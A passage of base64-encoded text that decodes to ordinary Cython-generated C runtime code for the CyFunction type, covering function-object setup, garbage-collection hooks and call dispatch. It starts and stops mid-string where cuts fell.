1JVEVEX0FQSQogICAgb3AtPmZ1bmMgPSBQeUNGdW5jdGlvbl9OZXdFeChtbCwgKFB5T2JqZWN0KilvcCwgbW9kdWxlKTsKICAgIGlmICh1bmxpa2VseSghb3AtPmZ1bmMpKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICBvcC0+ZmxhZ3MgPSBmbGFnczsKICAgIF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3Qob3ApID0gTlVMTDsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBjZi0+bV9tbCA9IG1sOwogICAgY2YtPm1fc2VsZiA9IChQeU9iamVjdCAqKSBvcDsKI2VuZGlmCiAgICBQeV9YSU5DUkVGKGNsb3N1cmUpOwogICAgb3AtPmZ1bmNfY2xvc3VyZSA9IGNsb3N1cmU7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfWElOQ1JFRihtb2R1bGUpOwogICAgY2YtPm1fbW9kdWxlID0gbW9kdWxlOwojZW5kaWYKICAgIG9wLT5mdW5jX2RpY3QgPSBOVUxMOwogICAgb3AtPmZ1bmNfbmFtZSA9IE5VTEw7CiAgICBQeV9JTkNSRUYocXVhbG5hbWUpOwogICAgb3AtPmZ1bmNfcXVhbG5hbWUgPSBxdWFsbmFtZTsKICAgIG9wLT5mdW5jX2RvYyA9IE5VTEw7CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgb3AtPmZ1bmNfY2xhc3NvYmogPSBOVUxMOwojZWxzZQogICAgKChQeUNNZXRob2RPYmplY3QqKW9wKS0+bW1fY2xhc3MgPSBOVUxMOwojZW5kaWYKICAgIG9wLT5mdW5jX2dsb2JhbHMgPSBnbG9iYWxzOwogICAgUHlfSU5DUkVGKG9wLT5mdW5jX2dsb2JhbHMpOwogICAgUHlfWElOQ1JFRihjb2RlKTsKICAgIG9wLT5mdW5jX2NvZGUgPSBjb2RlOwogICAgb3AtPmRlZmF1bHRzID0gTlVMTDsKICAgIG9wLT5kZWZhdWx0c190dXBsZSA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfa3dkaWN0ID0gTlVMTDsKICAgIG9wLT5kZWZhdWx0c19nZXR0ZXIgPSBOVUxMOwogICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSBOVUxMOwogICAgb3AtPmZ1bmNfaXNfY29yb3V0aW5lID0gTlVMTDsKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgICBzd2l0Y2ggKG1sLT5tbF9mbGFncyAmIChNRVRIX1ZBUkFSR1MgfCBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9OT0FSR1MgfCBNRVRIX08gfCBNRVRIX0tFWVdPUkRTIHwgTUVUSF9NRVRIT0QpKSB7CiAgICBjYXNlIE1FVEhfTk9BUkdTOgogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1M7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIE1FVEhfTzoKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTzsKICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9NRVRIT0QgfCBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUzoKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUzoKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFM7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gTlVMTDsKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1N5c3RlbUVycm9yLCAiQmFkIGNhbGwgZmxhZ3MgZm9yIEN5RnVuY3Rpb24iKTsKICAgICAgICBQeV9ERUNSRUYob3ApOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZW5kaWYKICAgIHJldHVybiAoUHlPYmplY3QgKikgb3A7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIFB5X0NMRUFSKG0tPmZ1bmNfY2xvc3VyZSk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9DTEVBUihtLT5mdW5jKTsKI2Vsc2UKICAgIFB5X0NMRUFSKCgoUHlDRnVuY3Rpb25PYmplY3QqKW0pLT5tX21vZHVsZSk7CiNlbmRpZgogICAgUHlfQ0xFQVIobS0+ZnVuY19kaWN0KTsKICAgIFB5X0NMRUFSKG0tPmZ1bmNfbmFtZSk7CiAgICBQeV9DTEVBUihtLT5mdW5jX3F1YWxuYW1lKTsKICAgIFB5X0NMRUFSKG0tPmZ1bmNfZG9jKTsKICAgIFB5X0NMRUFSKG0tPmZ1bmNfZ2xvYmFscyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2NvZGUpOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMQogICAgUHlfQ0xFQVIoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7CiNlbHNlCiAgICB7CiAgICAgICAgUHlPYmplY3QgKmNscyA9IChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChtKSktPm1tX2NsYXNzOwogICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChtKSktPm1tX2NsYXNzID0gTlVMTDsKICAgICAgICBQeV9YREVDUkVGKGNscyk7CiAgICB9CiNlbmRpZgojZW5kaWYKICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzX3R1cGxlKTsKICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzX2t3ZGljdCk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2Fubm90YXRpb25zKTsKICAgIFB5X0NMRUFSKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX2RlYWxsb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSkKewogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QobSkgIT0gTlVMTCkKICAgICAgICBQeU9iamVjdF9DbGVhcldlYWtSZWZzKChQeU9iamVjdCAqKSBtKTsKICAgIF9fUHl4X0N5RnVuY3Rpb25fY2xlYXIobSk7CiAgICBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChtKTsKfQpzdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX2RlYWxsb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSkKewogICAgUHlPYmplY3RfR0NfVW5UcmFjayhtKTsKICAgIF9fUHl4X19DeUZ1bmN0aW9uX2RlYWxsb2MobSk7Cn0Kc3RhdGljIGludCBfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKQp7CiAgICB7CiAgICAgICAgaW50IGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoKFB5T2JqZWN0KiltLCAxLCB2aXNpdCwgYXJnKTsKICAgICAgICBpZiAoZSkgcmV0dXJuIGU7CiAgICB9CiAgICBQeV9WSVNJVChtLT5mdW5jX2Nsb3N1cmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfVklTSVQobS0+ZnVuYyk7CiNlbHNlCiAgICBQeV9WSVNJVCgoKFB5Q0Z1bmN0aW9uT2JqZWN0KiltKS0+bV9tb2R1bGUpOwojZW5kaWYKICAgIFB5X1ZJU0lUKG0tPmZ1bmNfZGljdCk7CiAgICBfX1B5eF9WSVNJVF9DT05TVChtLT5mdW5jX25hbWUpOwogICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19xdWFsbmFtZSk7CiAgICBQeV9WSVNJVChtLT5mdW5jX2RvYyk7CiAgICBQeV9WSVNJVChtLT5mdW5jX2dsb2JhbHMpOwogICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19jb2RlKTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9WSVNJVChfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKG0pKTsKI2VuZGlmCiAgICBQeV9WSVNJVChtLT5kZWZhdWx0c190dXBsZSk7CiAgICBQeV9WSVNJVChtLT5kZWZhdWx0c19rd2RpY3QpOwogICAgUHlfVklTSVQobS0+ZnVuY19pc19jb3JvdXRpbmUpOwogICAgUHlfVklTSVQobS0+ZGVmYXVsdHMpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0KgpfX1B5eF9DeUZ1bmN0aW9uX3JlcHIoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApCnsKICAgIFB5T2JqZWN0ICpyZXByOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICByZXByID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoIjxjeWZ1bmN0aW9uICVVIGF0ICVwPiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3AtPmZ1bmNfcXVhbG5hbWUsICh2b2lkICopb3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXByOwp9CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKmYgPSAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jOwogICAgUHlDRnVuY3Rpb24gbWV0aDsKICAgIGludCBmbGFnczsKICAgIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmKTsKICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMOwogICAgZmxhZ3MgPSBQeUNGdW5jdGlvbl9HZXRGbGFncyhmKTsKICAgIGlmICh1bmxpa2VseShmbGFncyA8IDApKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uT2JqZWN0KiBmID0gKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jOwogICAgUHlDRnVuY3Rpb24gbWV0aCA9IGYtPm1fbWwtPm1sX21ldGg7CiAgICBpbnQgZmxhZ3MgPSBmLT5tX21sLT5tbF9mbGFnczsKI2VuZGlmCiAgICBQeV9zc2l6ZV90IHNpemU7CiAgICBzd2l0Y2ggKGZsYWdzICYgKE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFMgfCBNRVRIX05PQVJHUyB8IE1FVEhfTykpIHsKICAgIGNhc2UgTUVUSF9WQVJBUkdTOgogICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpCiAgICAgICAgICAgIHJldHVybiAoKm1ldGgpKHNlbGYsIGFyZyk7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgcmV0dXJuICgqKFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKW1ldGgpKHNlbGYsIGFyZywga3cpOwogICAgY2FzZSBNRVRIX05PQVJHUzoKICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKSB7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShhcmcpOwojZWxzZQogICAgICAgICAgICBzaXplID0gUHlUdXBsZV9TaXplKGFyZyk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplIDwgMCkpIHJldHVybiBOVUxMOwojZW5kaWYKICAgICAgICAgICAgaWYgKGxpa2VseShzaXplID09IDApKQogICAgICAgICAgICAgICAgcmV0dXJuICgqbWV0aCkoc2VsZiwgTlVMTCk7CiAgICAgICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoCiAgICAgICAgICAgICAgICAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYywKICAgICAgICAgICAgICAgICJ0YWtlcyBubyBhcmd1bWVudHMiLCBzaXplKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX086CiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoYXJnKTsKI2Vsc2UKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSA8IDApKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAxKSkgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKnJlc3VsdCwgKmFyZzA7CiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgICAgIGFyZzAgPSBQeVR1cGxlX0dFVF9JVEVNKGFyZywgMCk7CiAgICAgICAgICAgICAgICAjZWxzZQogICAgICAgICAgICAgICAgYXJnMCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShhcmcsIDApOyBpZiAodW5saWtlbHkoIWFyZzApKSByZXR1cm4gTlVMTDsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgcmVzdWx0ID0gKCptZXRoKShzZWxmLCBhcmcwKTsKICAgICAgICAgICAgICAgICNpZiAhKENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKQogICAgICAgICAgICAgICAgUHlfREVDUkVGKGFyZzApOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoCiAgICAgICAgICAgICAgICAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYywKICAgICAgICAgICAgICAgICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIHNpemUpOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19TeXN0ZW1FcnJvciwgIkJhZCBjYWxsIGZsYWdzIGZvciBDeUZ1bmN0aW9uIik7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsICJ0YWtlcyBubyBrZXl3b3JkIGFyZ3VtZW50cyIpOwogICAgcmV0dXJuIE5VTEw7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7CiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyktPmZ1bmMpOwogICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChmdW5jLCBzZWxmLCBhcmcsIGt3KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0NhbGxBc01ldGhvZChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZ3MsIFB5T2JqZWN0ICprdykgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpCiAgICAgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChjeWZ1bmMpOwogICAgaWYgKHZjKSB7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgcmV0dXJuIF9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoZnVuYywgdmMsICZQeVR1cGxlX0dFVF9JVEVNKGFyZ3MsIDApLCAoc2l6ZV90KVB5VHVwbGVfR0VUX1NJWkUoYXJncyksIGt3KTsKI2Vsc2UKICAgICAgICAodm9pZCkgJl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3Q7CiAgICAgICAgcmV0dXJuIFB5VmVjdG9yY2FsbF9DYWxsKGZ1bmMsIGFyZ3MsIGt3KTsKI2VuZGlmCiAgICB9CiNlbmRpZgogICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkgewogICAgICAgIFB5X3NzaXplX3QgYXJnYzsKICAgICAgICBQeU9iamVjdCAqbmV3X2FyZ3M7CiAgICAgICAgUHlPYmplY3QgKnNlbGY7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGFyZ2MgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZ3MpOwojZWxzZQogICAgICAgIGFyZ2MgPSBQeVR1cGxlX1NpemUoYXJncyk7CiAgICAgICAgaWYgKHVubGlrZWx5KGFyZ2MgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgICAgIG5ld19hcmdzID0gUHlUdXBsZV9HZXRTbGljZShhcmdzLCAxLCBhcmdjKTsKICAgICAgICBpZiAodW5saWtlbHkoIW5ld19hcmdzKSkKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgc2VsZiA9IFB5VHVwbGVfR2V0SXRlbShhcmdzLCAwKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRihuZXdfYXJncyk7CiAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAidW5ib3VuZCBtZXRob2QgJS4yMDBTKCkgbmVlZHMgYW4gYXJndW1lbnQiLAogICAgICAgICAgICAgICAgICAgICAgICAgY3lmdW5jLT5mdW5jX3F1YWxuYW1lKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChmdW5jLCBzZWxmLCBuZXdfYXJncywga3cpOwogICAgICAgIFB5X0RFQ1JFRihuZXdfYXJncyk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbChmdW5jLCBhcmdzLCBrdyk7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpCnsKICAgIGludCByZXQgPSAwOwogICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkgewogICAgICAgIGlmICh1bmxpa2VseShuYXJncyA8IDEpKSB7CiAgICAgICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcigKICAgICAgICAgICAgICAgIGN5ZnVuYywgIm5lZWRzIGFuIGFyZ3VtZW50Iik7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAgICAgcmV0ID0gMTsKICAgIH0KICAgIGlmICh1bmxpa2VseShrd25hbWVzKSAmJiB1bmxpa2VseShfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGt3bmFtZXMpKSkgewogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcigKICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8ga2V5d29yZCBhcmd1bWVudHMiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gcmV0Owp9CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpCnsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYzsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBpZiAodW5saWtlbHkobmFyZ3MgIT0gMCkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBubyBhcmd1bWVudHMiLCBuYXJncyk7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gbWV0aChzZWxmLCBOVUxMKTsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7CiNlbHNlCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7CiNlbmRpZgogICAgUHlPYmplY3QgKnNlbGY7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7CiNlbmRpZgogICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIGt3bmFtZXMpKSB7CiAgICBjYXNlIDE6CiAgICAgICAgc2VsZiA9IGFyZ3NbMF07CiAgICAgICAgYXJncyArPSAxOwogICAgICAgIG5hcmdzIC09IDE7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIDA6CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0K